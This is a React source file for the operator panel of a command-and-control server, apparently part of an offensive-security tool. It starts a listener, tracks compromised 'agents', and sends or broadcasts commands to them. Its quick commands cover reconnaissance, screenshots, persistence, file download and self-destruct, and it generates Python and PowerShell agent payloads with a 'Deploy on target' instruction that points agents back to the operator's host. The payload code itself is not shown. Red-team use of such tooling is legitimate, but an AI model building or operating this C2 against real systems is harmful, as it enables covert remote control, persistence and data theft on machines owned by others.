import React, { useState, useCallback, useEffect, useRef } from 'react';

interface C2Config {
  listenHost: string;
  listenPort: number;
  useHttps: boolean;
  userAgent: string;
}

interface C2Agent {
  id: string;
  hostname: string;
  username: string;
  os: string;
  ip: string;
  firstSeen: string;
  lastCheckin: string;
  status: 'online' | 'offline' | 'dead';
}

interface C2Task {
  id: string;
  agentId: string;
  command: string;
  status: 'queued' | 'sent' | 'completed' | 'failed';
  result: string | null;
  createdAt: string;
  completedAt: string | null;
}

const QUICK_COMMANDS = [
  { label: 'whoami', cmd: 'whoami' },
  { label: 'IP config', cmd: 'ipconfig' },
  { label: 'System info', cmd: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"' },
  { label: 'Running procs', cmd: 'tasklist' },
  { label: 'Network conns', cmd: 'netstat -ano' },
  { label: 'List users', cmd: 'net user' },
  { label: 'List dir', cmd: 'dir /B' },
  { label: 'Screenshot', cmd: 'screenshot' },
  { label: 'Persistence', cmd: 'persist' },
  { label: 'Download file', cmd: 'download C:\\Users\\Public\\' },
  { label: 'Self-destruct', cmd: 'selfdestruct' },
];

export function C2Panel() {
  const [serverStatus, setServerStatus] = useState<{ running: boolean; agents: number; tasks: number } | null>(null);
  const [config, setConfig] = useState<C2Config>({ listenHost: '0.0.0.0', listenPort: 8080, useHttps: false, userAgent: '' });
  const [agents, setAgents] = useState<C2Agent[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
  const [tasks, setTasks] = useState<C2Task[]>([]);
  const [customCommand, setCustomCommand] = useState('');
  const [payloadScript, setPayloadScript] = useState('');
  const [payloadType, setPayloadType] = useState<'python' | 'powershell'>('python');
  const [log, setLog] = useState<string[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [log]);

  const addLog = (msg: string) => {
    setLog((prev) => [...prev.slice(-99), `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  // Poll server status
  useEffect(() => {
    if (!serverStatus?.running) return;
    pollRef.current = setInterval(async () => {
      try {
        const s = await window.api.c2Status();
        setServerStatus(s);
        const a = await window.api.c2Agents();
        setAgents(a);
        if (selectedAgent) {
          const t = await window.api.c2Tasks(selectedAgent);
          setTasks(t);
        }
      } catch {}
    }, 3000);
    return () => { if (pollRef.current) clearInterval(pollRef.current); };
  }, [serverStatus?.running, selectedAgent]);

  const handleStart = useCallback(async () => {
    try {
      const result = await window.api.c2Start(config);
      if (result) {
        setServerStatus({ running: true, agents: 0, tasks: 0 });
        addLog(`C2 server started on ${config.listenHost}:${config.listenPort}`);
      }
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [config]);

  const handleStop = useCallback(async () => {
    await window.api.c2Stop();
    setServerStatus(null);
    setAgents([]);
    addLog('C2 server stopped');
  }, []);

  const handleRefresh = useCallback(async () => {
    try {
      const s = await window.api.c2Status();
      setServerStatus(s);
      const a = await window.api.c2Agents();
      setAgents(a);
    } catch {}
  }, []);

  const handleSendCommand = useCallback(async (command: string) => {
    if (!selectedAgent || !command.trim()) return;
    try {
      const result = await window.api.c2SendCommand(selectedAgent, command.trim());
      if (result) {
        addLog(`Sent to ${selectedAgent}: ${command.slice(0, 60)}`);
        setCustomCommand('');
        // Refresh tasks
        const t = await window.api.c2Tasks(selectedAgent);
        setTasks(t);
      }
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [selectedAgent]);

  const handleBroadcast = useCallback(async () => {
    if (!customCommand.trim()) return;
    try {
      const result = await window.api.c2Broadcast(customCommand.trim());
      addLog(`Broadcast to ${result?.length || 0} agents: ${customCommand.slice(0, 60)}`);
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [customCommand]);

  const handleGeneratePayload = useCallback(async () => {
    try {
      const script = await window.api.c2GeneratePayload(payloadType);
      setPayloadScript(script);
      addLog(`Generated ${payloadType} payload (${script.length} chars)`);
    } catch (err: any) {
      addLog(`Error: ${err.message}`);
    }
  }, [payloadType]);

  const selectAgent = useCallback(async (id: string) => {
    setSelectedAgent(id);
    try {
      const t = await window.api.c2Tasks(id);
      setTasks(t);
    } catch {}
  }, []);

  return (
    <div className="space-y-4">
      {/* ── Server Controls ── */}
      <div className="card border-midnight-700/50">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <span className="text-lg">📡</span>
            <h2 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">C2 Server</h2>
          </div>
          {serverStatus?.running && (
            <div className="flex items-center gap-3 text-xs">
              <span className="flex items-center gap-1.5 text-green-400">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                Running
              </span>
              <span className="text-gray-500">{serverStatus.agents} agents</span>
              <span className="text-gray-500">{serverStatus.tasks} tasks</span>
            </div>
          )}
        </div>

        <div className="grid grid-cols-4 gap-2 mb-3">
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Bind Host</label>
            <input type="text" value={config.listenHost}
              onChange={(e) => setConfig({ ...config, listenHost: e.target.value })}
              className="input-field h-8 text-xs font-mono" placeholder="0.0.0.0"
              disabled={serverStatus?.running} />
          </div>
          <div>
            <label className="text-[10px] text-gray-500 block mb-1">Port</label>
            <input type="number" value={config.listenPort}
              onChange={(e) => setConfig({ ...config, listenPort: parseInt(e.target.value) || 8080 })}
              className="input-field h-8 text-xs font-mono" placeholder="8080"
              disabled={serverStatus?.running} />
          </div>
          <div className="flex items-end">
            <label className="flex items-center gap-2 text-xs text-gray-500 pb-1.5">
              <input type="checkbox" checked={config.useHttps}
                onChange={(e) => setConfig({ ...config, useHttps: e.target.checked })}
                disabled={serverStatus?.running}
                className="rounded bg-midnight-800 border-midnight-600" />
              HTTPS
            </label>
          </div>
          <div className="flex items-end">
            {!serverStatus?.running ? (
              <button onClick={handleStart} className="btn-primary w-full h-8 text-xs">
                ▶ Start Server
              </button>
            ) : (
              <button onClick={handleStop} className="btn-secondary w-full h-8 text-xs border-redhawk-700 text-redhawk-400">
                ⏹ Stop Server
              </button>
            )}
          </div>
        </div>

        {/* Status refresh */}
        {serverStatus?.running && (
          <button onClick={handleRefresh} className="btn-ghost text-xs">↻ Refresh Status</button>
        )}
      </div>

      {/* ── Agent List + Command Console ── */}
      {serverStatus?.running && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
          {/* Agent list */}
          <div className="card lg:col-span-1">
            <div className="card-header">Agents ({agents.length})</div>
            {agents.length === 0 ? (
              <div className="text-center py-6 text-gray-600">
                <span className="text-2xl block mb-2">📡</span>
                <p className="text-xs">Waiting for agents to connect...</p>
                <p className="text-[10px] mt-1">Deploy the agent payload on a target</p>
              </div>
            ) : (
              <div className="space-y-1.5 max-h-80 overflow-y-auto">
                {agents.map((agent) => (
                  <div
                    key={agent.id}
                    onClick={() => selectAgent(agent.id)}
                    className={`p-2.5 rounded-lg cursor-pointer border transition-all ${
                      selectedAgent === agent.id
                        ? 'bg-redhawk-600/10 border-redhawk-600/40'
                        : 'bg-midnight-800/30 border-midnight-700/30 hover:border-midnight-600/50'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <span className="text-sm font-mono text-gray-200 truncate">{agent.hostname}</span>
                      <span className={`w-2 h-2 rounded-full ${
                        agent.status === 'online' ? 'bg-green-500' :
                        agent.status === 'offline' ? 'bg-yellow-500' : 'bg-red-500'
                      }`} />
                    </div>
                    <div className="flex items-center gap-2 text-[10px] text-gray-500 mt-0.5">
                      <span>{agent.username}</span>
                      <span>•</span>
                      <span className="truncate">{agent.ip}</span>
                    </div>
                    <p className="text-[9px] text-gray-600 mt-0.5">
                      Last: {new Date(agent.lastCheckin).toLocaleTimeString()}
                    </p>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Command console */}
          <div className="card lg:col-span-2">
            <div className="card-header flex items-center justify-between">
              <span>Command Console {selectedAgent ? `— ${selectedAgent}` : ''}</span>
              {selectedAgent && (
                <button onClick={() => handleSendCommand('screenshot')} className="btn-ghost text-xs">
                  📸 Screenshot
                </button>
              )}
            </div>

            {!selectedAgent ? (
              <p className="text-gray-500 text-xs text-center py-6">Select an agent to send commands</p>
            ) : (
              <>
                {/* Quick commands */}
                <div className="flex flex-wrap gap-1 mb-3">
                  {QUICK_COMMANDS.slice(0, 8).map((qc, idx) => (
                    <button
                      key={idx}
                      onClick={() => handleSendCommand(qc.cmd)}
                      className="text-[10px] px-2 py-1 rounded bg-midnight-800 border border-midnight-700
                                 text-gray-500 hover:text-gray-300 hover:border-midnight-600 transition-all"
                    >
                      {qc.label}
                    </button>
                  ))}
                </div>

                {/* Custom command input */}
                <div className="flex gap-2 mb-3">
                  <input
                    type="text" value={customCommand}
                    onChange={(e) => setCustomCommand(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && handleSendCommand(customCommand)}
                    placeholder="Enter command or path (e.g., dir C:\Users\Public\*)"
                    className="input-field h-9 text-xs font-mono flex-1"
                  />
                  <button onClick={() => handleSendCommand(customCommand)} disabled={!customCommand.trim()}
                    className="btn-primary h-9 text-xs px-4">Send</button>
                  <button onClick={handleBroadcast} disabled={!customCommand.trim()}
                    className="btn-secondary h-9 text-xs px-3" title="Send to all agents">📡 All</button>
                </div>

                {/* Task output */}
                {tasks.length > 0 && (
                  <div className="space-y-1.5 max-h-60 overflow-y-auto">
                    {tasks.slice().reverse().map((task) => (
                      <div key={task.id} className="p-2 rounded bg-midnight-800/30 border border-midnight-700/30">
                        <div className="flex items-center justify-between text-xs">
                          <span className="text-gray-400 font-mono truncate flex-1">{task.command}</span>
                          <span className={`text-[10px] px-1.5 py-0.5 rounded ml-2 ${
                            task.status === 'completed' ? 'bg-green-900/30 text-green-400' :
                            task.status === 'failed' ? 'bg-red-900/30 text-red-400' :
                            task.status === 'sent' ? 'bg-blue-900/30 text-blue-400' :
                            'bg-yellow-900/30 text-yellow-400'
                          }`}>{task.status}</span>
                        </div>
                        {task.result && (
                          <pre className="mt-1 text-[10px] text-gray-500 font-mono whitespace-pre-wrap max-h-20 overflow-y-auto">
                            {task.result.slice(0, 500)}
                          </pre>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </>
            )}
          </div>
        </div>
      )}

      {/* ── Payload Generation ── */}
      <div className="card">
        <div className="card-header">Generate Agent Payload</div>
        <div className="flex items-center gap-3 mb-3">
          <select value={payloadType} onChange={(e) => setPayloadType(e.target.value as any)}
            className="input-field h-9 text-xs w-40">
            <option value="python" className="bg-midnight-900">Python Agent</option>
            <option value="powershell" className="bg-midnight-900">PowerShell Agent</option>
          </select>
          <button onClick={handleGeneratePayload} className="btn-primary h-9 text-xs">
            Generate
          </button>
          {payloadScript && (
            <button onClick={() => { navigator.clipboard.writeText(payloadScript); }}
              className="btn-ghost text-xs">📋 Copy</button>
          )}
        </div>
        {payloadScript && (
          <pre className="terminal text-[10px] max-h-48 overflow-y-auto whitespace-pre-wrap">
            {payloadScript}
          </pre>
        )}
        <p className="text-[10px] text-gray-600 mt-2">
          Deploy on target: <code className="bg-midnight-950 px-1 rounded text-green-400">python c2_agent.py http://your-ip:{config.listenPort}</code>
        </p>
      </div>

      {/* ── Activity Log ── */}
      <div className="card">
        <div className="card-header">Activity Log</div>
        <div className="terminal text-[10px] max-h-40 overflow-y-auto">
          {log.length === 0 ? (
            <span className="text-gray-600">No activity yet. Start the server to begin.</span>
          ) : (
            log.map((entry, i) => <div key={i} className="text-gray-500">{entry}</div>)
          )}
          <div ref={logEndRef} />
        </div>
      </div>
    </div>
  );
}
